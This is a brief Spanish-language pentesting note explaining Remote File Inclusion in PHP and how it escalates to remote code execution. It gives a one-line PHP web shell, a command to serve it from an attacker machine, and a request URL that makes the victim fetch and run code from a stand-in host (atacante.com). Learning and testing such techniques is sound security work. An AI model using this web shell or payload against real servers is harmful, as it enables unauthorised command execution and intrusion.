# RFI - Remote File Inclusion

## ¿Que es?

**Remote File Inclusión** es un tipo de **LFI** que permite conectarse a aplicaciones externas. Un ejemplo sería:

```
http://victima.com/index.php?page=http://atacante.com/index.php
```

Para incluir un archivo remoto en PHP, las opciones allow_url_fopen (habilitada de forma predeterminada) y allow_url_include deben estar activadas en la configuración del servidor php de la máquina victima.


## Remote File Inclusion (RFI) a Remote Code Execution (RCE)

La forma es relativamente sencilla. Nos creamos un payload php:

```bash
echo "<?php system($_GET['cmd']); ?>" > prueba.php
```

Ahora levantamos un servicio http en la maquina atacante:

```bash
python3 -m http.server 8888
```


Y podemos ejecutar comandos:

```
http://victima.com/index.php?page=http://atacante.com/prueba.php&cmd=whoami
```

